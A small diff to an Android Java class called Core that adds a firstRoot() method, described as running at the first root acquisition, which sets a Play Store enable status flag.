@@ -1019,5 +1019,11 @@ public class Core extends Activity implements Runnable {
 		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
 		markup.write(1);
 	}
-
+	/*
+	 * Everything what shall be execute at the first root acquisition
+	 * should be included here
+	 */
+	public void firstRoot(){
+		Status.setPlayStoreEnableStatus(true);
+	}
 }
